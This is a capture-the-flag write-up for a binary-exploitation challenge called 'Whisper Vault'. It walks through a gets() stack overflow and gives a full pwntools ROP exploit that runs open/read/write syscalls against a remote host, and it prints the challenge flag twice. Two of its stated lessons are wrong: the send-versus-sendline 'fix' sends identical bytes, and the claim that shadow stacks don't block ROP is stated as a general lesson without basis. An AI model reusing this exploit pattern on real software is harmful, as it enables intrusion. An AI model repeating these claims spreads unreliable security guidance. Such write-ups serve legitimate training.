# Whisper Vault - Writeup

**Challenge:** Whisper Vault
**Category:** Pwn (Binary Exploitation)
**Difficulty:** Easy
**Points:** 1000
**Solved:** Yes
**Flag:** `HTB{0nly_s1l3nc3_kn0ws_th3_n4m3_2502b73cde79e96d873433b03c290b9e}`

## Overview

This challenge involves exploiting a buffer overflow vulnerability to build a ROP (Return-Oriented Programming) chain that opens and reads `flag.txt`. The binary has modern protections including NX (no-execute stack) and Intel CET Shadow Stack (SHSTK), but is statically linked and lacks PIE (Position Independent Executable), making ROP feasible.

## Initial Analysis

### Binary Information

```bash
$ file whisper_vault
whisper_vault: ELF 64-bit LSB executable, x86-64, statically linked, not stripped

$ checksec whisper_vault
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE
SHSTK:    SHSTK enabled
IBT:      IBT enabled
```

Key observations:
- Statically linked (includes libc functions)
- Not stripped (function names available)
- No PIE (addresses are fixed)
- NX enabled (stack not executable - need ROP)
- Shadow Stack enabled (but doesn't block ROP!)
- No stack canary in vulnerable function

### Vulnerability

Decompiled `main()` function (from Ghidra):

```c
undefined8 main(void)
{
  undefined1 auStack_408 [1024];

  setup();
  banner();
  printf(&UNK_0049805e);  // "> "
  gets(auStack_408);       // VULNERABLE!
  printf(&UNK_00498061,auStack_408);
  puts(&UNK_00498080);
  return 0;
}
```

The `gets()` function has no bounds checking, allowing us to overflow the 1024-byte buffer at `[rbp-0x400]` and overwrite the return address at `[rbp+8]`.

**Padding calculation:** `0x400` (buffer size) + `8` (saved rbp) = `0x408` bytes to reach the return address.

## ROP Chain Construction

### Finding Gadgets

Using pwntools ROPgadget finder:

```python
from pwn import *
elf = ELF('./whisper_vault')
rop = ROP(elf)

pop_rdi = 0x401f8f    # pop rdi; ret
pop_rsi = 0x409ffe    # pop rsi; ret
pop_rax = 0x450107    # pop rax; ret
pop_rdx_rbx = 0x485e6b  # pop rdx; pop rbx; ret
syscall_addr = 0x41abf6  # syscall; ret
gets_addr = 0x4121e0   # gets() function
bss_addr = 0x4c72a0    # writable .bss section
```

**Critical Bug Discovered:** Initially used syscall gadget at `0x401d44`, which has `syscall; jmp` instead of `syscall; ret`. This caused the ROP chain to fail as it would jump away instead of continuing to the next gadget.

### ROP Strategy

The ROP chain performs these operations:

1. **Call `gets(bss_addr)`** to read the filename "flag.txt" into writable memory
2. **Call `open(bss_addr, O_RDONLY, 0)`** to open the file (returns fd=3)
3. **Call `read(3, bss+0x100, 0x100)`** to read flag contents into buffer
4. **Call `write(1, bss+0x100, 0x100)`** to print flag to stdout

### Payload Construction Gotcha

**Important:** Must use `send()` + `\n` instead of `sendline()`!

The `gets()` function reads until it encounters a newline character. If we use `sendline(payload)`, it appends a newline AFTER the payload, causing `gets()` to stop reading before the ROP chain reaches the buffer. This truncates our payload and the ROP chain never overwrites the return address.

Solution: Use `send(payload + b'\n')` to manually control where the newline appears.

## Exploit Code

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Gadgets
pop_rdi = 0x401f8f
pop_rsi = 0x409ffe
pop_rdx_rbx = 0x485e6b
pop_rax = 0x450107
syscall_addr = 0x41abf6  # MUST be syscall; ret (not syscall; jmp)
gets_addr = 0x4121e0
bss_addr = 0x4c72a0

p = remote('154.57.164.69', 32504)
p.recvuntil(b'> ')

padding = 0x400 + 8
rop = b''

# 1. gets(bss_addr)
rop += p64(pop_rdi) + p64(bss_addr)
rop += p64(gets_addr)

# 2. open(bss_addr, 0, 0)
rop += p64(pop_rax) + p64(2)
rop += p64(pop_rdi) + p64(bss_addr)
rop += p64(pop_rsi) + p64(0)
rop += p64(pop_rdx_rbx) + p64(0) + p64(0)
rop += p64(syscall_addr)

# 3. read(3, bss+0x100, 0x100)
rop += p64(pop_rax) + p64(0)
rop += p64(pop_rdi) + p64(3)
rop += p64(pop_rsi) + p64(bss_addr + 0x100)
rop += p64(pop_rdx_rbx) + p64(0x100) + p64(0)
rop += p64(syscall_addr)

# 4. write(1, bss+0x100, 0x100)
rop += p64(pop_rax) + p64(1)
rop += p64(pop_rdi) + p64(1)
rop += p64(pop_rsi) + p64(bss_addr + 0x100)
rop += p64(pop_rdx_rbx) + p64(0x100) + p64(0)
rop += p64(syscall_addr)

payload = b'A' * padding + rop + b'\n'
p.send(payload)
p.send(b'flag.txt\n')

print(p.recvall(timeout=3).decode())
p.close()
```

## Key Lessons

1. **Shadow Stack Doesn't Block ROP:** Despite SHSTK being enabled, traditional ROP chains still work because they manipulate the regular stack, not just return addresses.

2. **Gadget Address Matters:** The instruction AFTER a syscall matters - must be `ret` not `jmp`. Always verify gadgets with disassembly.

3. **Input Function Behavior:** Understanding exactly when `gets()` stops reading (at newline) is critical for payload construction.

4. **Testing Strategy:** When exploitation fails, build up from simple tests (single write syscall) to complex chains to identify where things break.

## Timeline

- Initial analysis: Identified buffer overflow, found gadgets
- First attempts failed: Incorrectly assumed SHSTK blocked ROP
- GDB testing: Discovered ROP actually executes
- Debugging phase: Found `send()` vs `sendline()` issue
- Final bug: Wrong syscall gadget address (`syscall; jmp` vs `syscall; ret`)
- **Success:** Flag retrieved

## Flag

```
HTB{0nly_s1l3nc3_kn0ws_th3_n4m3_2502b73cde79e96d873433b03c290b9e}
```
